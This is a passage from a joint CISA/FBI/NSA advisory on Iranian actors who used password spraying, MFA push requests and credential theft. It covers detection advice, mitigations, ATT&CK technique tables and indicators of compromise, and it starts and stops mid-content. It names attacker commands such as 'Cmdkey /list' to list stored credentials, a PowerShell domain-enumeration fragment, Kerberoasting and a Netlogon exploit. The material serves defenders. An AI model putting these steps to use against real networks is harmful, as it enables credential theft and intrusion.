&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$CA.Properties.Item('distinguishedName')</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$i++</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>}</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>Write-host Total servers: $i</code></p>
<h3><strong>Command and Control</strong></h3>
<p>On one occasion, using&nbsp;msedge.exe, the actors likely made outbound connections to Cobalt Strike Beacon command and control (C2) infrastructure [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/001/\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a>].</p>
<h3><strong>Exfiltration and Collection</strong></h3>
<p>In a couple instances, while logged in to victim accounts, the actors downloaded files related to gaining remote access to the organization and to the organization’s inventory [<a href=\"https://attack.mitre.org/techniques/T1005/\" title=\"Data from Local System\">T1005</a>], likely exfiltrating the files to further persist in the victim network or to sell the information online.</p>
<h2><strong>Detection</strong></h2>
<p>To detect brute force activity, the authoring agencies recommend reviewing authentication logs for system and application login failures of valid accounts and looking for multiple, failed authentication attempts across all accounts.</p>
<p>To detect the use of compromised credentials in combination with virtual infrastructure, the authoring agencies recommend the following steps:</p>
<ul>
<li>Look for “impossible logins,” such as suspicious logins with changing usernames, user agent strings, and IP address combinations or logins where IP addresses do not align to the user’s expected geographic location.</li>
<li>Look for one IP used for multiple accounts, excluding expected logins.</li>
<li>Look for “impossible travel.” Impossible travel occurs when a user logs in from multiple IP addresses with significant geographic distance (i.e., a person could not realistically travel between the geographic locations of the two IP addresses during the period between the logins). <strong>Note:</strong> Implementing this detection opportunity can result in false positives if legitimate users apply VPN solutions before connecting into networks.</li>
<li>Look for MFA registrations with MFA in unexpected locales or from unfamiliar devices.</li>
<li>Look for processes and program execution command-line arguments that may indicate credential dumping, especially attempts to access or copy the&nbsp;<code>ntds.dit</code> file from a domain controller.</li>
<li>Look for suspicious privileged account use after resetting passwords or applying user account mitigations.</li>
<li>Look for unusual activity in typically dormant accounts.</li>
<li>Look for unusual user agent strings, such as strings not typically associated with normal user activity, which may indicate bot activity.</li>
</ul>
<h2><strong>Mitigations</strong></h2>
<p>The authoring agencies recommend organizations implement the mitigations below to improve organizations’ cybersecurity posture based on the actors’ TTPs described in this advisory. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA. The CPGs, which are organized to align to the National Institute of Standards and Technology (NIST) Cybersecurity Framework, are a subset of cybersecurity practices, aimed at meaningfully reducing risks to both critical infrastructure operations and the American people. These voluntary CPGs strive to help small- and medium-sized organizations kick-start their cybersecurity efforts by prioritizing investment in a limited number of essential actions with high-impact security outcomes. Visit CISA’s&nbsp;<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<ul>
<li>Review IT helpdesk password management related to initial passwords, password resets for user lockouts, and shared accounts. IT helpdesk password procedures may not align to company policy for user verification or password strength, creating a security gap. Avoid common passwords (e.g. “Spring2024” or “Password123!”).</li>
<li>Disable user accounts and access to organizational resources for departing staff [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#RevokingCredentialsforDepartingEmployees2D\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.D</a>]. Disabling accounts can minimize system exposure, removing options actors can leverage for entry into the system. Similarly, create new user accounts as close as possible to an employee’s start date.</li>
<li>Implement phishing-resistant MFA [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#PhishingResistantMultifactorAuthenticationMFA2H\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.H</a>]. See CISA’s resources&nbsp;<a href=\"https://www.cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf\" title=\"Implementing Phishing-Resistant MFA\">Phishing-Resistant Multifactor Authentication</a>&nbsp;and&nbsp;<a href=\"https://www.cisa.gov/MFA\" title=\"More than a Password\">More than a Password</a> for additional information on strengthening user credentials.</li>
<li>Continuously review MFA settings to ensure coverage over all active, internet-facing protocols to ensure no exploitable services are exposed [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NoExploitableServicesontheInternet2W\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.W</a>].</li>
<li>Provide basic cybersecurity training to users [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#BasicCybersecurityTraining2I\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.I</a>] covering concepts such as:
<ul>
<li>Detecting unsuccessful login attempts [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectionofUnsuccessfulAutomatedLoginAttempts2G\">CPG 2.G</a>].</li>
<li>Having users deny MFA requests they have not generated.</li>
<li>Ensuring users with MFA-enabled accounts have MFA set up appropriately.</li>
</ul>
</li>
<li>Ensure password policies align with the latest <a href=\"https://pages.nist.gov/800-63-4/sp800-63.html\" title=\"NIST Digital Identity Guidelines\">NIST Digital Identity Guidelines</a>.
<ul>
<li>Meeting the minimum password strength [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MinimumPasswordStrength2B\">CPG 2.B</a>] by creating a password using 8-64 nonstandard characters and long passphrases, when possible.</li>
</ul>
</li>
<li>Disable the use of RC4 for Kerberos authentication.</li>
</ul>
<p>These mitigations apply to critical infrastructure entities across sectors.</p>
<p>The authoring agencies also recommend software manufacturers incorporate secure by design principles and tactics into their software development practices to protect their customers against actors using compromised credentials, thereby strengthening the security posture of their customers. &nbsp;For more information on secure by design, see CISA’s <a href=\"https://www.cisa.gov/securebydesign\" title=\"Secure by Design\">Secure by Design</a> webpage and <a href=\"https://www.cisa.gov/resources-tools/resources/secure-by-design-and-default\" title=\"Secure-by-Design\">joint guide</a>.</p>
<h2><strong>Validate Security Controls</strong></h2>
<p>In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating organization security programs against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see <strong>Table 1 to Table 12)</strong>.</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h2><strong>Contact Information</strong></h2>
<p>Organizations are encouraged to report suspicious or criminal activity related to information in this advisory to:</p>
<ul>
<li>CISA via CISA’s 24/7 Operations Center [<a href=\"mailto:report@cisa.gov\">report@cisa.gov</a> or 1-844-Say-CISA (1-844-729-2472)] or your local <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"FBI Field Offices\">FBI field office</a>. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.</li>
<li>For NSA cybersecurity guidance inquiries, contact <a href=\"mailto:CybersecurityReports@nsa.gov\">CybersecurityReports@nsa.gov</a>.</li>
</ul>
<h2><strong>Disclaimer</strong></h2>
<p>The information in this report is being provided “as is” for informational purposes only. The authoring agencies do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring agencies.</p>
<p>Intrusion events connected to this Iranian group may also include a different set of cyber actors–likely the third-party actors who purchased access from the Iranian group via cybercriminal forums or other channels. As a result, some TTPs and IOCs noted in this advisory may be tied to these third-party actors, not the Iranian actors. The TTPs and IOCs are in the advisory to provide recipients the most complete picture of malicious activity that may be observed on compromised networks. However, exercise caution if formulating attribution assessments based solely on matching TTPs and IOCs.</p>
<h2><strong>Version History</strong></h2>
<p><strong>October 16, 2024: </strong>Initial version.</p>
<h2><strong>Appendix A: MITRE ATT&amp;CK Tactics and Techniques</strong></h2>
<p>See <strong>Tables 1–12</strong>&nbsp;for all referenced actors’ tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK® Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"Decider Tool\">Decider Tool</a>.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1: Reconnaissance</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title&nbsp;</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Gather Victim Identity Information</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1589/001/\" title=\"Gather Victim Identity Information: Credentials\">T1589</a></td>
<td>The actors likely gathered victim information.</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2: Resource Development</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title&nbsp;</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Obtain Capabilities: Tool</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1588/002/\" title=\"Obtain Capabilities: Tool\">T1588.002</a></td>
<td>The actors obtained a password spray tool through an open-source repository.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3: Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Valid Accounts</td>
<td><a href=\"https://attack.mitre.org/techniques/T1078/\" title=\"Valid Accounts\">T1078</a></td>
<td>The actors used password spraying to obtain valid user and group email account credentials, allowing them access to the network.</td>
</tr>
<tr>
<td>Valid Accounts: Cloud Accounts</td>
<td><a href=\"https://attack.mitre.org/techniques/T1078/004/\" title=\"Valid Accounts: Cloud Accounts\">T1078.004</a></td>
<td>The actors used accounts hosted on Microsoft 365, Azure, and Okta cloud environments as additional methods for initial access.</td>
</tr>
<tr>
<td>External Remote Services</td>
<td><a href=\"https://attack.mitre.org/techniques/T1133/\" title=\"External Remote Services\">T1133</a></td>
<td>The actors exploited Citrix systems’ external-facing remote services as another method for gaining initial access to the system.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4: Execution</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title&nbsp;</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter: PowerShell</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a></td>
<td>The actors used PowerShell commands to maintain and expand access.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5: Persistence</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Account Manipulation: Device Registration</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1098/005/\" title=\"Account Manipulation: Device Registration\">T1098.005</a></td>
<td>The actors used PowerShell commands to maintain and expand access.</td>
</tr>
<tr>
<td>Modify Authentication Process</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1556/\" title=\"Modify Authentication Process\">T1556</a></td>
<td>The actors used a public facing Active Directory Federation Service (ADFS) domain to reset the passwords of expired accounts.</td>
</tr>
<tr>
<td>Modify Authentication Process: Multi-Factor Authentication</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1556/006/\" title=\"Modify Authentication Process: Multi-Factor Authentication\">T1556.006</a></td>
<td>The actors used an MFA bypass method, such as Multi-Factor Authentication Request Generation, providing the ability to modify or completely disable MFA defenses.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6: Privilege Escalation</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exploitation for Privilege Escalation</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1068/\" title=\"Exploitation for Privilege Escalation\">T1068</a></td>
<td>The actors attempted impersonation of the domain controller likely by exploiting CVE-2020-1472, Microsoft’s Netlogon Privilege Escalation vulnerability.</td>
</tr>
<tr>
<td>Domain or Tenant Policy Modification: Trust Modification</td>
<td><a href=\"https://attack.mitre.org/techniques/T1484/002/\" title=\"Domain or Tenant Policy Modification: Trust Modification\">T1484.002</a></td>
<td>The actors leveraged a public-facing ADFS password reset tool to reactivate inactive accounts, allowing the actor to authenticate and enroll their devices as any user in the AD managed by the victim tenant.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7: Defense Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Indirect Command Execution</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1202/\" title=\"Indirect Command Execution\">T1202</a></td>
<td>The actors attempted impersonation of the Domain Controller likely by exploiting CVE-2020-1472, Microsoft’s Netlogon Privilege Escalation vulnerability.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8: Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Brute Force: Password Spraying</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/003/\" title=\"Brute Force: Password Spraying\">T1110.003</a></td>
<td>The actors targeted applications, including Single Sign-on (SSO) Microsoft Office 365, using brute force password sprays and imported the tool <code>DomainPasswordSpray.ps1</code>.</td>
</tr>
<tr>
<td>Credentials from Password Stores</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1555/\" title=\"Credentials from Password Stores\">T1555</a></td>
<td>The actors used the command <code>Cmdkey /list</code> likely to display usernames and credentials.</td>
</tr>
<tr>
<td>Steal or Forge Kerberos Tickets: Kerberoasting</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1558/003/\" title=\"Steal or Forge Kerberos Tickets: Kerberoasting\">T1558.003</a></td>
<td>The actors performed Kerberos Service Principal Name (SPN) enumeration of several service accounts and received Rivest Cipher 4 (RC4) tickets.</td>
</tr>
<tr>
<td>Multi-Factor Authentication Request Generation</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1621/\" title=\"Multi-Factor Authentication Request Generation\">T1621</a></td>
<td>The actors sent MFA requests to legitimate users.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9: Discovery</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote System Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1018\" title=\"Remote System Discovery\">T1018</a></td>
<td>The actors used LOTL to return information about domain controllers.</td>
</tr>
<tr>
<td>Permission Groups Discovery: Domain Groups</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1069/002/\" title=\"Permission Groups Discovery: Domain Groups\">T1069.002</a></td>
<td>The actors used LOTL to return lists of domain administrators and enterprise administrators.</td>
</tr>
<tr>
<td>Permission Groups Discovery: Cloud Groups</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1069/003/\" title=\"Permission Groups Discovery: Cloud Groups\">T1069.003</a></td>
<td>The actors used LOTL to return lists of domain administrators and enterprise administrators.</td>
</tr>
<tr>
<td>System Information Discovery&nbsp;</td>
<td><a href=\"https://attack.mitre.org/techniques/T1082/\" title=\"System Information Discovery\">T1082</a></td>
<td>The actors were able to query the AD to discover display names, operating systems, descriptions, and distinguished names from the computer.</td>
</tr>
<tr>
<td>Account Discovery: Domain Account</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1087/002/\" title=\"Account Discovery: Domain Account\">T1087.002</a></td>
<td>The actors used LOTL to return lists of domain administrators and enterprise administrators.</td>
</tr>
<tr>
<td>Domain Trust Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1482\" title=\"Domain Trust Discovery\">T1482</a></td>
<td>The actors used LOTL to return information about trusted domains.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10: Lateral Movement</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title&nbsp;</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Services: Remote Desktop Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/001/\" title=\"Remote Services: Remote Desktop Protocol\">T1021.001</a></td>
<td>The actors used Microsoft Word to open PowerShell to launch RDP binary mstsc.exe.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 11: Collection</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data from Local System</td>
<td><a href=\"https://attack.mitre.org/techniques/T1005/\" title=\"Data from Local System\">T1005</a></td>
<td>The actors downloaded files related to remote access methods and the organization’s inventory.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 12: Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Application Layer Protocol: Web Protocols</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/001/\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a></td>
<td>The actors used <code>msedge.exe</code> to make outbound connections likely to Cobalt Strike Beacon C2 infrastructure.</td>
</tr>
<tr>
<td>Ingress Tool Transfer</td>
<td><a href=\"https://attack.mitre.org/techniques/T1105/\" title=\"Ingress Tool Transfer\">T1105</a></td>
<td>The actors imported a tool from GitHub and used it to conduct password spraying.</td>
</tr>
<tr>
<td>Protocol Tunneling</td>
<td><a href=\"https://attack.mitre.org/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a></td>
<td>The actors frequently conduct targeting using a virtual private network (VPN).</td>
</tr>
</tbody>
</table>
<h2><strong>Appendix B: Indicators of Compromise</strong></h2>
<p>See <strong>Tables 13 to 15</strong> for IOCs obtained from FBI investigations.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table&nbsp;13: Malicious Files Associated with Iranian Cyber Actors</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Hash</th>
<th role=\"columnheader\">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>1F96D15B26416B2C7043EE7172357AF3AFBB002A</td>
<td>Associated with malicious activity.</td>
</tr>
<tr>
<td>3D3CDF7CFC881678FEBCAFB26AE423FE5AA4EFEC</td>
<td>Associated with malicious activity.</td>
</tr>
</tbody>
</table>
<p><strong>Disclaimer:</strong> The authoring organizations recommend network defenders investigate or vet IP addresses prior to taking action, such as blocking, as many cyber actors are known to change IP addresses, sometimes daily, and some IP addresses may host valid domains. Many of the IP addresses provided below are assessed VPN nodes and as such are not exclusive to the Iranian actors’ use. The authoring organizations do not recommend blocking these IP addresses based solely on their inclusion in this JCSA. The authoring organizations recommend using the below IP addresses to search for previous activity the actors may have conducted against networks. If positive hits for these IP addresses are identified, the authoring organizations recommend making an independent determination if the observed activity aligns with the TTPs outlined in the JCSA. The timeframes included in the table reflect the timeframe the actors likely used the IPs.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table&nbsp;14: Network Indicators</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">IP Address</th>
<th role=\"columnheader\">Date Range</th>
</tr>
</thead>
<tbody>
<tr>
<td>95.181.234.12</td>
<td>01/30/2024 to 02/07/2024</td>
</tr>
<tr>
<td>95.181.234.25</td>
<td>01/30/2024 to 02/07/2024</td>
</tr>
<tr>
<td>173.239.232.20</td>
<td>10/06/2023 to 12/19/2023</td>
</tr>
<tr>
<td>172.98.71.191</td>
<td>10/15/2023 to 11/27/2023</td>
</tr>
<tr>
<td>102.129.235.127</td>
<td>10/21/2023 to 10/22/2023</td>
</tr>
<tr>
<td>188.126.94.60</td>
<td>10/22/2023 to 01/12/2024</td>
</tr>
<tr>
<td>149.40.50.45</td>
<td>10/26/2023</td>
</tr>
<tr>
<td>181.214.166.59</td>
<td>10/26/2023</td>
</tr>
<tr>
<td>212.102.39.212</td>
<td>10/26/2023</td>
</tr>
<tr>
<td>149.57.16.134</td>
<td>10/26/2023 to 10/27/2023</td>
</tr>
<tr>
<td>149.57.16.137</td>
<td>10/26/2023 to 10/27/2023</td>
</tr>
<tr>
<td>102.129.235.186</td>
<td>10/29/2023 to 11/08/2023</td>
</tr>
<tr>
<td>46.246.8.138</td>
<td>10/31/2023 to 01/26/2024</td>
</tr>
<tr>
<td>149.57.16.160</td>
<td>11/08/2023</td>
</tr>
<tr>
<td>149.57.16.37</td>
<td>11/08/2023</td>
</tr>
<tr>
<td>46.246.8.137</td>
<td>11/17/2023 to 01/25/2024</td>
</tr>
<tr>
<td>212.102.57.29</td>
<td>11/19/2023 to 01/17/2024</td>
</tr>
<tr>
<td>46.246.8.82</td>
<td>11/22/2023 to 01/28/2024</td>
</tr>
<tr>
<td>95.181.234.15</td>
<td>11/26/2023 to 02/07/2024</td>
</tr>
<tr>
<td>45.88.97.225</td>
<td>11/27/2023 to 02/11/2024</td>
</tr>
<tr>
<td>84.239.45.17</td>
<td>12/04/2023 to 12/07/2023</td>
</tr>
<tr>
<td>46.246.8.104</td>
<td>12/07/2023 to 02/07/2024</td>
</tr>
<tr>
<td>37.46.113.206</td>
<td>12/07/2023</td>
</tr>
<tr>
<td>46.246.3.186</td>
<td>12/07/2023 to 12/09/2023</td>
</tr>
<tr>
<td>46.246.8.141</td>
<td>12/07/2023 to 02/10/2024</td>
</tr>
<tr>
<td>46.246.8.17</td>
<td>12/09/2023 to 01/09/2024</td>
</tr>
<tr>
<td>37.19.197.182</td>
<td>12/15/2023</td>
</tr>
<tr>
<td>154.16.192.38</td>
<td>12/25/2023 to 01/24/2024</td>
</tr>
<tr>
<td>102.165.16.127</td>
<td>12/27/2023 to 01/28/2024</td>
</tr>
<tr>
<td>46.246.8.47</td>
<td>12/29/2023 to 01/29/2024</td>
</tr>
<tr>
<td>46.246.3.225</td>
<td>12/30/2023 to 02/06/2024</td>
</tr>
<tr>
<td>46.246.3.226</td>
<td>12/31/2023 to 02/03/2024</td>
</tr>
<tr>
<td>46.246.3.240</td>
<td>12/31/2023 to 02/06/2024</td>
</tr>
<tr>
<td>191.101.217.10</td>
<td>01/05/2024</td>
</tr>
<tr>
<td>102.129.153.182</td>
<td>01/08/2024</td>
</tr>
<tr>
<td>46.246.3.196</td>
<td>01/08/2024</td>
</tr>
<tr>
<td>102.129.152.60</td>
<td>01/09/2024</td>
</tr>
<tr>
<td>156.146.60.74</td>
<td>01/10/2024</td>
</tr>
<tr>
<td>191.96.227.113</td>
<td>01/10/2024</td>
</tr>
<tr>
<td>191.96.227.122</td>
<td>01/10/2024</td>
</tr>
<tr>
<td>181.214.166.132</td>
<td>01/11/2024</td>
</tr>
<tr>
<td>188.126.94.57</td>
<td>01/11/2024 to 01/13/2024</td>
</tr>
<tr>
<td>154.6.13.144</td>
<td>01/13/2024 to 01/24/2024</td>
</tr>
<tr>
<td>154.6.13.151</td>
<td>01/13/2024 to 01/28/2024</td>
</tr>
<tr>
<td>188.126.94.166</td>
<td>01/15/2024</td>
</tr>
<tr>
<td>89.149.38.204</td>
<td>01/18/2024</td>
</tr>
<tr>
<td>46.246.8.67</td>
<td>01/20/2024</td>
</tr>
<tr>
<td>46.246.8.53</td>
<td>01/22/2024</td>
</tr>
<tr>
<td>154.16.192.37</td>
<td>01/24/2024</td>
</tr>
<tr>
<td>191.96.150.14</td>
<td>01/24/2024</td>
</tr>
<tr>
<td>191.96.150.96</td>
<td>01/24/2024</td>
</tr>
<tr>
<td>46.246.8.10</td>
<td>01/24/2024</td>
</tr>
<tr>
<td>84.239.25.13</td>
<td>01/24/2024</td>
</tr>
<tr>
<td>154.6.13.139</td>
<td>01/26/2024</td>
</tr>
<tr>
<td>191.96.106.33</td>
<td>01/26/2024</td>
</tr>
<tr>
<td>191.96.227.159</td>
<td>01/26/2024</td>
</tr>
<tr>
<td>149.57.16.150</td>
<td>01/27/2024</td>
</tr>
<tr>
<td>191.96.150.21</td>
<td>01/27/2024</td>
</tr>
<tr>
<td>46.246.8.84</td>
<td>01/27/2024</td>
</tr>
<tr>
<td>95.181.235.8</td>
<td>01/27/2024</td>
</tr>
<tr>
<td>191.96.227.102</td>
<td>01/27/2024 to 01/28/2024</td>
</tr>
<tr>
<td>46.246.122.185</td>
<td>01/28/2024</td>
</tr>
<tr>
<td>146.70.102.3</td>
<td>01/29/2024 to 01/30/2024</td>
</tr>
<tr>
<td>46.246.3.233</td>
<td>01/30/2024 to 02/15/2024</td>
</tr>
<tr>
<td>46.246.3.239</td>
<td>01/30/2024 to 02/15/2024</td>
</tr>
<tr>
<td>188.126.89.35</td>
<td>02/03/2024</td>
</tr>
<tr>
<td>46.246.3.223</td>
<td>02/03/2024</td>
</tr>
<tr>
